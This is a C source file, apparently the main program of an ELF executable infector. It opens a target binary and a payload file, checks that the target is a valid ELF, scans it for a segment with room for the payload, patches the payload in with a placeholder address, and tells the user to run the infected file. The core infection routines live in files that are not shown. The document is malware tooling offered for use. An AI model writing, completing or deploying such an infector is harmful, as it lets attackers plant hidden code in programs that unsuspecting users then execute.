#include <string.h>
#include <errno.h>
#include <assert.h>
#include <unistd.h>
#include <assert.h>

#include "common.h"
#include "utils.h"
#include "log.h"
#include "elfo.h"
#include "parse.h"
#include "map.h"
#include "asm.h"
#include "print.h"
#include "validate.h"
#include "destroy.h"
#include "infect.h"

extern elf_info_t   _program[];

int main(int argc, char **argv)
{
    if (argc < 3) {
        log_info("Use %s <elf file> <infection>\n", argv[0]);
        asm_exit(0);
    }

    open_mode_t m1,m2;
    const char *file = argv[1];
    FILE *fp = file_open_rw(file, &m1);
    assert(fp);
    FILE *infection = file_open_rw(argv[2], &m2);
    assert(infection);

    if(!elf_validate_filetype(fp)) {
        log_error("Not a valid ELF file");
        asm_exit(1);
    }

    elf_t *elfo = elf_parse_file(file, fp, m1);

    infect_t *inf = inf_load(elfo, infection);
    if (inf_scan_segment(inf)) {
        if (inf_load_and_patch(inf, m1, (long)0x1122334455667788) == true)
            printf("Done!\nTry running %s\n", file);
        else
            printf("Failed :(\n");
    }

    assert(elf_destroy_all(elfo));
    file_close(fp);

    return 0;
}
